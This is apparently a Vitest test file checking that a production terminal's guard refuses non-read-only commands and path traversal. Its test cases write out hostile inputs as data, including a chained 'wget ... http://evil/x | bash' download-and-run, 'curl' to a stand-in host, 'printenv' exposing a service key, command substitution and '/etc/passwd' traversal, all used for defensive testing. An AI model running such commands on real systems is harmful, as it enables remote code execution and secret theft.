import { describe, it, expect } from 'vitest'
import {
  resolveInside,
  tokenize,
  serverlessRefusal,
  SERVERLESS_ALLOWED_BINARIES,
} from '../terminalGuards'

/**
 * These tests exist because the production terminal advertised a read-only
 * posture it did not have. Each block below is a bypass that worked before
 * 2026-08-23. If one of these ever goes green-to-red, production shell access
 * has been reopened — do not "fix" the test.
 */
describe('serverless command gate', () => {
  it('refuses node -e, which is arbitrary code execution', () => {
    expect(SERVERLESS_ALLOWED_BINARIES.has('node')).toBe(false)
    expect(serverlessRefusal('node -e "require(\'fs\').writeFileSync(\'/tmp/x\',\'1\')"')).toBeTruthy()
  })

  it('refuses env and printenv, which print SUPABASE_SERVICE_KEY', () => {
    expect(serverlessRefusal('env')).toBeTruthy()
    expect(serverlessRefusal('printenv')).toBeTruthy()
  })

  it('refuses a second command chained behind an allowed one', () => {
    // The old gate regex-matched the START of the string, so this passed.
    expect(serverlessRefusal('echo ok; wget -O- http://evil/x | bash')).toBeTruthy()
    expect(serverlessRefusal('echo ok && curl http://evil/x')).toBeTruthy()
    expect(serverlessRefusal('cat package.json > /tmp/leak')).toBeTruthy()
    expect(serverlessRefusal('echo `id`')).toBeTruthy()
    expect(serverlessRefusal('echo $(id)')).toBeTruthy()
  })

  it('refuses git subcommands that write', () => {
    expect(serverlessRefusal('git config user.email x@y.z')).toBeTruthy()
    expect(serverlessRefusal('git push')).toBeTruthy()
    expect(serverlessRefusal('git checkout main')).toBeTruthy()
  })

  it('still allows the plain read-only commands the terminal promises', () => {
    expect(serverlessRefusal('git log --oneline -5')).toBeNull()
    expect(serverlessRefusal('git status')).toBeNull()
    expect(serverlessRefusal('ls -la')).toBeNull()
    expect(serverlessRefusal('cat package.json')).toBeNull()
    expect(serverlessRefusal('echo hello world')).toBeNull()
  })

  it('rejects an empty command', () => {
    expect(serverlessRefusal('')).toBeTruthy()
  })
})

describe('tokenize', () => {
  it('honours quoting so argv is what the caller wrote', () => {
    expect(tokenize('git log --oneline -5')).toEqual(['git', 'log', '--oneline', '-5'])
    expect(tokenize('echo "hello world"')).toEqual(['echo', 'hello world'])
    expect(tokenize("echo 'a b'")).toEqual(['echo', 'a b'])
  })
})

describe('resolveInside', () => {
  const root = '/srv/app'

  it('accepts paths inside the root', () => {
    expect(resolveInside(root, 'server/api/x.ts')).toBe('/srv/app/server/api/x.ts')
    expect(resolveInside(root, '')).toBe('/srv/app')
  })

  it('rejects traversal out of the root', () => {
    expect(resolveInside(root, '../secrets.env')).toBeNull()
    expect(resolveInside(root, '/etc/passwd')).toBeNull()
    expect(resolveInside(root, 'a/../../b')).toBeNull()
  })

  it('rejects a sibling directory that merely shares the prefix', () => {
    // The old guard was resolved.startsWith(root), so /srv/app-secrets passed.
    expect(resolveInside(root, '../app-secrets/keys.json')).toBeNull()
  })
})
